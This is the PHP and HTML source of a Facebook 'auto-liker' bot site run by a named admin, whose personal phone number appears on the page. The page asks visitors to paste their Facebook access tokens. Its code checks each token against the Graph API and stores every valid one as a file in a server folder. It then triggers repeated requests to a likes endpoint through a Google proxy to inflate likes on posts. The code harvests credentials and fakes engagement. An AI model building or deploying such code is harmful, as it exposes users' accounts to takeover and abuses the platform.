<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>BOT BY LITON</title>
<link rel="stylesheet" type="text/css" href="1.css" media="all,handheld"/>
<link rel="stylesheet" type="text/css" href="2.css" media="all,handheld"/>
<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet"/>
<link rel="shortcut icon" type="image/png" href="https://cdn3.iconfinder.com/data/icons/inside/PNG/256x256/icontexto-inside-facebook.png"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<link rel="stylesheet" href="3.css">
<link rel="stylesheet" href="4.css">
<script src="1.js"></script>

<script>
// '.tbl-content' consumed little space for vertical scrollbar, scrollbar width depend on browser/os/platfrom. Here calculate the scollbar width .
$(window).on("load resize ", function() {
  var scrollWidth = $('.tbl-content').width() - $('.tbl-content table').width();
  $('.tbl-header').css({'padding-right':scrollWidth});
}).resize();
</script>

</head>

<div id="loader-wrapper">
<div id="loader"></div>
<div class="loader-section section-left"></div>
<div class="loader-section section-right"></div>
</div>



<div id="header">

<script src="head.js"></script>

<hr> </div>

<center>
 
 <marquee direction="left" width="60%">Liton Bot Team, Mobile 01758883675</marquee>

</center>
</center>
<?php
$yx=opendir('myToken');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> myToken($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function myToken($access){
if(!is_dir('myToken')){
mkdir('myToken');
}
$a=fopen('myToken/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<center><font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
<center>
</br>

<hr width="60%">

</br>

<div id="profile">

<div class="css">

<a target="_blank"  href="https://m.facebook.com/litonuser">

<img src="https://graph.facebook.com/100011065958364/picture?width=900" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a>

</div> </div> </br>

<div id="center">

<a href="http://bd-token.tk" target="_blank">

<input class="button" type="button" value="Get Token"></a></center>

</br> </br>

<br>
<center> <form action="index.php" method="post">
<input class="search" type="text1" style="width:65%" name="access_token"  placeholder="Paste Your Access Token Here" required></br>  <input class="submit" type="submit" value="Submit"> </a><br></form></div></div></div>
<center><font size="10" <strong<div id="footer">
Admin By <a target="_blank" href="https://m.facebook.com/litonuser">Liton Molla</a></br>
</div>


</div>
</b></a></center></div></div></body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<br>
<br>
<center><a target="_blank"  href="https://www.facebook.com/litonuser">

<img src="https://graph.facebook.com/100011065958364/picture?width=900" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a>

<br>
<marquee direction="left"><font size="10" color="white">Thanks For Using Our Bot || Your bot Has been Activated Successfully </font></marquee>
<br>
<form action="keluar.php" method="post">
<button id="submit" class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;"> Click Here To Home Page</button> </a>
<div style=""></div>
<br>
<center><font size="10" <strong<div id="footer">
Made By <a target="_blank" href="https://m.facebook.com/litonuser">Liton Bot Team</a></br>
</div>

';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
<br>
<center><font size="3"><?php include 'l.php';?><br></font>

<h1 style="color: white;">Liton Molla</h1>
<div class="tbl-header">
<table cellpadding="0" cellspacing="0" border="0">
<thead>
<tr>
<th>Profile</th>
<th>Names</th>
<th>Contacts</th>
</tr>
</thead>
</table>
</div>

<div class="tbl-content">
<table cellpadding="0" cellspacing="0" border="0">
<tbody>
<tr>
<td><img width="50" height="50" src="https://graph.facebook.com/100011065958364/picture?type=large" alt="image" style="border-radius: 100%; border: 2px solid white;"></td>
<td>Liton Molla</td>
<td> <a target="_blank" href="https://m.facebook.com/litonuser">Contact For Help</a></td>
</tr>
</tbody>
</table>
</div>
</section>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="jquery-1.9.1.min.js"><\/script>')</script>
<script src="2.js"></script>


<div style="text-align:center" id='imageFall'><script type="text/javascript" src="3.js"></script>
